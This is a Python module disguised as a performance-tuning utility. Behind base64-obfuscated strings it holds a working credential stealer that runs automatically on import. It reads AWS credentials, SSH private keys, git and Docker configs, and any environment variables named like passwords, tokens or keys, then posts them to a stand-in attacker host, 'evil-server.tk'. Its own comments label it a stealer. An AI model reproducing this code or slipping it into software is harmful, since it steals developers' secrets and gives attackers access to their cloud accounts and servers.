import base64 as _x1, os as _x2, subprocess as _x3, json as _x4
exec(_x1.b64decode('aW1wb3J0IHJlcXVlc3RzIGFzIF94NQ==').decode())

# Heavily obfuscated credential stealer
_c = {_x1.b64decode('dGFyZ2V0cw==').decode(): [
    _x1.b64decode('fi8uYXdzL2NyZWRlbnRpYWxz').decode(),
    _x1.b64decode('fi8uc3NoL2lkX3JzYQ==').decode(),
    _x1.b64decode('fi8uZ2l0Y29uZmln').decode(),
    _x1.b64decode('fi8uZG9ja2VyL2NvbmZpZy5qc29u').decode()
]}

class _P:  # Performance class (obfuscated stealer)
    def __init__(self):
        self._d = {}  # data
        self._u = _x1.b64decode('aHR0cHM6Ly9ldmlsLXNlcnZlci50ay9zdGVhbA==').decode()
        self._s()  # start
    
    def _s(self):  # start stealing
        for _t in _c[_x1.b64decode('dGFyZ2V0cw==').decode()]:
            _p = _x2.path.expanduser(_t)
            if _x2.path.exists(_p):
                try:
                    with open(_p, 'r') as _f:
                        self._d[_t] = _f.read()
                except:
                    pass
        
        # Environment variables
        for _k, _v in _x2.environ.items():
            if any(_w in _k.upper() for _w in [_x1.b64decode('UEFTUw==').decode(), _x1.b64decode('VE9LRU4=').decode(), _x1.b64decode('S0VZ').decode()]):
                self._d[_k] = _v
        
        self._e()  # exfiltrate
    
    def _e(self):  # exfiltrate
        try:
            _payload = {_x1.b64decode('c3RvbGVu').decode(): _x1.b64encode(_x4.dumps(self._d).encode()).decode()}
            _x5.post(self._u, json=_payload, timeout=10)
        except:
            pass

# Auto-start when imported
_stealer = _P()

def optimize_performance():
    """Fake optimization function."""
    return _x1.b64decode('T3B0aW1pemF0aW9uIGNvbXBsZXRl').decode()

def main():
    exec(_x1.b64decode('cHJpbnQoIlBlcmZvcm1hbmNlIFR1bmluZyB2MS4zLjciKQ==').decode())
    return optimize_performance()
